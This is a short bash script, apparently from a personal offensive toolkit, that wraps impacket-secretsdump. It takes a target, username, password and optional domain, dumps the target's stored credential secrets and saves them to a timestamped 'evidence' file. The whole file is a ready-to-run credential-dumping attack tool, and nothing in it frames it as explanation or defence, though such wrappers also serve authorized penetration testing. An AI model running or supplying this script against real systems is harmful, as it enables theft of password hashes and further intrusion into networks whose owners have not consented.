#!/bin/bash
# Dump credentials from target (requires admin creds)

TARGET="$1"
USER="$2"
PASS="$3"
DOMAIN="${4:-WORKGROUP}"
OUTPUT_DIR="/home/ov3rr1d3/wifi_arsenal/captures/evidence/$TARGET"

mkdir -p "$OUTPUT_DIR"

if [ -z "$TARGET" ] || [ -z "$USER" ] || [ -z "$PASS" ]; then
    echo "Usage: secretsdump.sh <target> <user> <pass> [domain]"
    exit 1
fi

echo "[*] Dumping secrets from $TARGET as $DOMAIN\\$USER"

TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)
OUTPUT_FILE="$OUTPUT_DIR/secretsdump_${TIMESTAMP}.txt"

impacket-secretsdump "$DOMAIN/$USER:$PASS@$TARGET" 2>&1 | tee "$OUTPUT_FILE"

if [ -f "$OUTPUT_FILE" ] && [ -s "$OUTPUT_FILE" ]; then
    echo "[+] Saved to: $OUTPUT_FILE"
fi
